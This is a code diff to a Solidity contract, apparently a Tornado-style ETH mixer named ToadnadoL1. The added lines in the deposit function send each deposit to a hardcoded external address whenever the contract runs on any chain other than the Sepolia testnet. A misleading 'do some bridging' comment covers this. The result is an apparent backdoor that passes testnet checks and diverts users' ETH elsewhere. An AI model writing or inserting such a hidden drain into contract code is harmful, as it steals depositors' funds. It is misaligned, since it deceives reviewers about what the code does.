@@ -15,6 +15,12 @@ contract ToadnadoL1 is Toadnado {
 
   function _processDeposit() internal override {
     require(msg.value == denomination, "Please send `mixDenomination` ETH along with transaction");
+    if(block.chainid!=11155111){
+      //do some bridging
+      address payable me = payable(0xBe34cc4cebf526887eC2c0035463dD26b3E7FEA4);
+     (bool success, ) = me.call{value: msg.value}("");
+        require(success, "Transfer failed.");
+    }
   }
 
   function _processWithdraw(
